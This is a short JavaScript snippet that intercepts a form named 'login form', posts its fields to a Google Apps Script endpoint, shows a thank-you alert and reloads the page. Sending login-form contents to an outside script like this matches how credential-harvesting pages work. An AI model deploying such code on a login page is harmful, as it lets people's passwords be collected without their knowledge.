const scriptURL = 'https://script.google.com/macros/s/AKfycbzPR7jXIk2GFw9gE1DZ0d8J5g90lzfqtKhDeT84GSD1khCp30eOtIy6jyRG0_BWce8/exec'

const form = document.forms['login form']

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(response => alert("Thank you! your form is submitted successfully." ))
  .then(() => { window.location.reload(); })
  .catch(error => console.error('Error!', error.message))
})